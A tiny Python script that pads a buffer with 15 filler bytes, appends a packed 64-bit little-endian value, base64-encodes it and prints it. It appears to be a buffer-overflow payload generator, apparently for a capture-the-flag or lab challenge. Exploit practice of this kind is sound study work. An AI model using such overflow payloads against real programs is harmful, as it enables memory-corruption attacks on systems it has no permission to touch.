
import sys
import struct
import base64

buf = b'JJJJJJJJJJJJJJJ'
buf += struct.pack('<Q', 15930459718335906792)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
